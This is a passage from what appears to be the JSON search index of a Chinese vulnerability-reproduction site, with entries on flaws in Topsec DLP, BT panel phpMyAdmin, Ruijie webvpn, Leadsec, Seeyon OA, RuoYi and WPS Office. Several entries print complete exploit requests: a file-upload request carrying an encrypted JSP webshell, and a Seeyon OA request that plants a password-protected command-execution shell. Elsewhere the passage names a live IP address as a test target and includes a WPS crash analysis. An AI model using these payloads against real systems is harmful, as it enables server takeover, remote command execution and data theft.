\u2f46\u9700\u767b\u5f55\u6743\u9650,\u7531\u4e8e\u4fee\u6539\u5bc6\u7801\u5904\u672a\u6821\u9a8c\u539f\u5bc6\u7801,\u4e14/?module=auth_user&action=mod_edit_pwd \u63a5\u2f1d\u672a\u6388\u6743\u8bbf\u95ee,\u9020\u6210\u76f4\u63a5\u4fee\u6539\u4efb\u610f\u2f64\u6237\u5bc6\u7801\u3002:\u9ed8\u8ba4superman\u8d26\u6237uid\u4e3a1\u3002","title":"\u5929\u878d\u4fe1\u6570\u636e\u9632\u6cc4\u6f0f\u7cfb\u7edf\u8d8a\u6743\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/#_1","text":"\u2f46\u9700\u767b\u5f55\u6743\u9650,\u7531\u4e8e\u4fee\u6539\u5bc6\u7801\u5904\u672a\u6821\u9a8c\u539f\u5bc6\u7801,\u4e14/?module=auth_user&action=mod_edit_pwd \u63a5\u2f1d\u672a\u6388\u6743\u8bbf\u95ee,\u9020\u6210\u76f4\u63a5\u4fee\u6539\u4efb\u610f\u2f64\u6237\u5bc6\u7801\u3002:\u9ed8\u8ba4superman\u8d26\u6237uid\u4e3a1\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 Linux\u9762\u677f7.4.2 Windows\u9762\u72486.8 \u6f0f\u6d1ePOC \u00b6 \u8bbf\u95ee\uff1a http://ip:888/pma \u5373\u53ef\u6210\u529f\u8fdb\u5165phpMyAdmin\u7ba1\u7406\u754c\u9762 \uff08\u9700\u8981\u5b89\u88c5\u4e86phpmyadmin\uff09","title":"\u5b9d\u5854\u9762\u677fphpMyAdmin\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","text":"Linux\u9762\u677f7.4.2 Windows\u9762\u72486.8","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#poc","text":"\u8bbf\u95ee\uff1a http://ip:888/pma \u5373\u53ef\u6210\u529f\u8fdb\u5165phpMyAdmin\u7ba1\u7406\u754c\u9762 \uff08\u9700\u8981\u5b89\u88c5\u4e86phpmyadmin\uff09","title":"\u6f0f\u6d1ePOC"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E7%BD%91%E7%91%9E%E8%BE%BEwebvpn%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u4efb\u610f\u666e\u901a\u8d26\u6237\u767b\u9646\u8fdb\u7cfb\u7edf\u8bbf\u95ee1.1.1.1@127.0.0.1:8860 \u8fd4\u56de\u201cpong\"\u4ee3\u8868\u53ef\u4ee5\u8fdb\u884cRCE \u8fd4\u56de401\u4ee3\u8868\u4e0d\u53ef\u4ee5\uff08\u7528\u57df\u540d\u89e3\u6790\u5230127\u7ed5\u8fc7\uff09","title":"\u7f51\u745e\u8fbewebvpn\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"\u754c\u9762 \u00b6 POC \u00b6 ``` POST /uai/download/uploadfileToPath.htm HTTP/1.1 HOST: xxxxx ... ... -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\" Content-Type: image/png <%@page import=\"java.util. ,javax.crypto. ,javax.crypto.spec. \"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/ \u8be5\u5bc6\u94a5\u4e3a\u8fde\u63a5\u5bc6\u780132\u4f4dmd5\u503c\u7684\u524d16\u4f4d\uff0c\u9ed8\u8ba4\u8fde\u63a5\u5bc6\u7801rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/ -----------------------------570xxxxxxxxx6025274xxxxxxxx1-- ```","title":"\u8054\u8f6f\u51c6\u5165-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_1","text":"","title":"\u754c\u9762"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#poc","text":"``` POST /uai/download/uploadfileToPath.htm HTTP/1.1 HOST: xxxxx ... ... -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\" Content-Type: image/png <%@page import=\"java.util. ,javax.crypto. ,javax.crypto.spec. \"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/ \u8be5\u5bc6\u94a5\u4e3a\u8fde\u63a5\u5bc6\u780132\u4f4dmd5\u503c\u7684\u524d16\u4f4d\uff0c\u9ed8\u8ba4\u8fde\u63a5\u5bc6\u7801rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/ -----------------------------570xxxxxxxxx6025274xxxxxxxx1-- ```","title":"POC"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","text":"\u5f71\u54cd\u7248\u672c \u00b6 \u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V6.1sp1 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.0\u3001V7.0sp1\u3001V7.0sp2\u3001V7.0sp3 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.1 \u5229\u7528\u524d\u63d0 \u8bbf\u95ee/seeyon/htmlofficeservlet\u51fa\u73b0 DBSTEP V3.0 0 21 0 htmoffice operate err POC \u8bf7\u6c42\u5305 \u00b6 POST /seeyon/htmlofficeservlet HTTP/1.1 Content-Length: 1121 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: xxxxxxxxx Pragma: no-cache DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce \u54cd\u5e94\u5305 \u00b6 DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 CLIENTIP=wLCXqUKAP7uhw4g5zi=6 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>","title":"\u81f4\u8fdcOA\u7cfb\u7edf\u591a\u7248\u672cGetshell\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_1","text":"\u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V6.1sp1 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.0\u3001V7.0sp1\u3001V7.0sp2\u3001V7.0sp3 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.1 \u5229\u7528\u524d\u63d0 \u8bbf\u95ee/seeyon/htmlofficeservlet\u51fa\u73b0 DBSTEP V3.0 0 21 0 htmoffice operate err POC","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_2","text":"POST /seeyon/htmlofficeservlet HTTP/1.1 Content-Length: 1121 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: xxxxxxxxx Pragma: no-cache DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce","title":"\u8bf7\u6c42\u5305"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_3","text":"DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 CLIENTIP=wLCXqUKAP7uhw4g5zi=6 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>","title":"\u54cd\u5e94\u5305"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%8B%A5%E4%BE%9D%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd\uff1a \u00b6 \u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u662f\u4e00\u6b3e\u57fa\u4e8eSpringBoot2.0\u91c7\u7528Spring\u3001MyBatis\u3001Shiro\u7684\u6743\u9650\u7ba1\u7406\u7cfb\u7edf,shiro\u6846\u67b6\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u540e\u53f0\u7f51\u7ad9\u7ba1\u7406\u5efa\u8bbe\u4e2d\uff0c\u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u6cbf\u7528\u5b58\u5728\u6f0f\u6d1e\u7684shiro\u6846\u67b6\uff0c\u53ef\u4f7f\u7528shiro\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb\u3002\u5f71\u54cd\u8303\u56f4\u5de8\u5927 \u5f71\u54cd\u8303\u56f4\uff1a \u00b6 \u82e5\u4f9d\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u5168\u7248\u672c\u3002 fofa\u641c\u7d22 \u00b6 fofa\u641c\u7d22\uff1aicon_hash=\"-1231872293\" \u6216\u8005 tiitle=\"\u82e5\u4f9d\" \u51e0\u4e4e\u767e\u5206\u4e4b90 \u5b58\u5728\u8be5\u6f0f\u6d1e URL1\u9a8c\u8bc1 URL1\uff1ahttp://47.103.141.149:9003/login \u6f0f\u6d1e\u622a\u56fe\uff1a \u9644\uff1ajava\u68c0\u6d4b\u811a\u672c \u94fe\u63a5: https://pan.baidu.com/s/1YcAFkAwwaKPkPicsiT-PQw \u63d0\u53d6\u7801: 27y4","title":"\u82e5\u4f9d\u5168\u7248\u672c\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%8B%A5%E4%BE%9D%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u662f\u4e00\u6b3e\u57fa\u4e8eSpringBoot2.0\u91c7\u7528Spring\u3001MyBatis\u3001Shiro\u7684\u6743\u9650\u7ba1\u7406\u7cfb\u7edf,shiro\u6846\u67b6\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u540e\u53f0\u7f51\u7ad9\u7ba1\u7406\u5efa\u8bbe\u4e2d\uff0c\u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u6cbf\u7528\u5b58\u5728\u6f0f\u6d1e\u7684shiro\u6846\u67b6\uff0c\u53ef\u4f7f\u7528shiro\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb\u3002\u5f71\u54cd\u8303\u56f4\u5de8\u5927","title":"\u6f0f\u6d1e\u5f71\u54cd\uff1a"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%8B%A5%E4%BE%9D%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"\u82e5\u4f9d\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u5168\u7248\u672c\u3002","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E8%8B%A5%E4%BE%9D%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"fofa\u641c\u7d22\uff1aicon_hash=\"-1231872293\" \u6216\u8005 tiitle=\"\u82e5\u4f9d\" \u51e0\u4e4e\u767e\u5206\u4e4b90 \u5b58\u5728\u8be5\u6f0f\u6d1e URL1\u9a8c\u8bc1 URL1\uff1ahttp://47.103.141.149:9003/login \u6f0f\u6d1e\u622a\u56fe\uff1a \u9644\uff1ajava\u68c0\u6d4b\u811a\u672c \u94fe\u63a5: https://pan.baidu.com/s/1YcAFkAwwaKPkPicsiT-PQw \u63d0\u53d6\u7801: 27y4","title":"fofa\u641c\u7d22"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u603b\u89c8 \u00b6 WPS Office\u662f\u7531Microsoft\u73e0\u6d77\u7684\u4e2d\u56fd\u8f6f\u4ef6\u5f00\u53d1\u5546\u91d1\u5c71\u8f6f\u4ef6\u5f00\u53d1\u7684\u529e\u516c\u5957\u4ef6\uff0c\u9002\u7528\u4e8eMicrosoft Windows\uff0cmacOS\uff0cLinux\uff0ciOS\u548cAndroid\u3002WPS Office\u7531\u4e09\u4e2a\u4e3b\u8981\u7ec4\u4ef6\u7ec4\u6210\uff1aWPS Writer\uff0cWPS Presentation\u548cWPS Spreadsheet\u3002\u4e2a\u4eba\u57fa\u672c\u7248\u672c\u53ef\u4ee5\u514d\u8d39\u4f7f\u7528\u3002WPS Office\u8f6f\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff0c\u662f\u5f53Office\u8f6f\u4ef6\u5728\u5206\u6790\u7279\u5236Office\u6587\u4ef6\u65f6\u4e0d\u6b63\u786e\u5730\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\u5f15\u8d77\u7684\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3002\u6545\u969c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\u6f0f\u6d1e\u4ea7\u54c1WPS Office\uff0c\u5f71\u54cd\u7248\u672c11.2.0.9453\u3002 \u6f0f\u6d1e\u5206\u6790 \u00b6 \u5728WPS Office\u4e2d\u7528\u4e8e\u56fe\u50cf\u683c\u5f0f\u89e3\u6790\u7684Qt\u6a21\u5757\u4e2d\u53d1\u73b0\u5806\u635f\u574f\u3002\u5d4c\u5165WPS office\u7684\u7279\u5236\u56fe\u50cf\u6587\u4ef6\u53ef\u80fd\u4f1a\u89e6\u53d1\u6b64\u6f0f\u6d1e\u3002\u6253\u5f00\u7279\u5236\u7684\u6587\u6863\u6587\u4ef6\u65f6\uff0c\u89e6\u53d1\u8bbf\u95ee\u51b2\u7a81\u3002EDX\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\uff0c\u800cEAX\u662f\u6307\u5411\u6570\u7ec4\u7684\u7d22\u5f15\u3002 0:000> g (c50.b4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=000000c0 ebx=006f1c48 ecx=cd2aefbc edx=cd2c6f80 esi=2ed7ae18 edi=0000001c eip=6ba13321 esp=006f1b44 ebp=006f1b44 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5d29\u6e83\u662f\u5982\u4f55\u89e6\u53d1\u7684\uff1f\u8ba9\u6211\u4eec\u770b\u4e00\u4e0bPNG\u6807\u5934\u683c\u5f0f\u3002 00029E30 FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 \u00ff\u2030PNG........IHD 00029E40 52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A R...\u20ac...\u00c6....... 00029E50 27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98 '\u00fc....gAMA..\u00b1\u02c6\u2022\u02dc 00029E60 F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00 \u00f4\u00a6...0PLTE...\u20ac.. 00029E70 00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80 .\u20ac.\u20ac\u20ac...\u20ac\u20ac.\u20ac.\u20ac\u20ac\u20ac 00029E80 80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00 \u20ac\u20ac\u00c0\u00c0\u00c0\u00ff...\u00ff.\u00ff\u00ff... 00029E90 FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00 \u00ff\u00ff.\u00ff.\u00ff\u00ff\u00ff\u00ff\u00ff{.\u00b1\u00c4.. \u4ece\u504f\u79fb\u91cf0x29E31\u5f00\u59cb-0x29E34\u662fPNG\u6587\u4ef6\u683c\u5f0f\u7684\u7b7e\u540d\u6807\u5934\u3002PNG\u5934\u6587\u4ef6\u7684\u7ed3\u6784\uff1a PNG signature --> IHDR --> gAMA --> PLTE --> pHYs --> IDAT --> IEND \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53WPS Office Suite\u4e2d\u4f7f\u7528\u7684QtCore\u5e93\u89e3\u6790PLTE\u7ed3\u6784\u5e76\u89e6\u53d1\u5806\u7834\u574f\u65f6\uff0c\u8be5\u6f0f\u6d1e\u4f4d\u4e8eWord\u6587\u6863\u4e2d\u7684\u5d4c\u5165\u5f0fPNG\u6587\u4ef6\u4e2d\u3002\u5728\u504f\u79fb\u91cf0x29E82\u52300x29E85\u5904\uff0c\u8c03\u8272\u677f\u7684\u89e3\u6790\u5931\u8d25\uff0c\u4ece\u800c\u89e6\u53d1\u4e86\u5806\u4e2d\u7684\u5185\u5b58\u635f\u574f\u3002\u5d29\u6e83\u89e6\u53d1\u4e4b\u524d\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71 01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234 02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e 03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b 04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8 05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98 07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325 08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a \u5728QtCore4\u89e3\u6790\u5d4c\u5165\u5f0f\u56fe\u50cf\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6765\u81eaKSO\u6a21\u5757\u7684\u6700\u540e\u4e00\u6b21\u8c03\u7528\uff0c\u8bd5\u56fe\u5904\u7406\u56fe\u50cfkso\uff01GdiDrawHoriLineIAlt\u3002\u4f7f\u7528IDA Pro\u5206\u89e3\u5e94\u7528\u7a0b\u5e8f\u6765\u5206\u6790\u53d1\u751f\u5f02\u5e38\u7684\u529f\u80fd\u3002\u6700\u540e\u7684\u5d29\u6e83\u8def\u5f84\u5982\u4e0b\uff08WinDBG\u7ed3\u679c\uff09\uff1a QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5728IDA Pro\u4e2d\u6253\u5f00\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u53cd\u6c47\u7f16\u8be5\u51fd\u6570\uff1a .text:67353315 push ebp .text:67353316 mov ebp, esp .text:67353318 movzx eax, byte ptr [ecx+edx] ; crash here .text:6735331C mov ecx, [ebp+arg_0] .text:6735331F mov edx, [ecx] 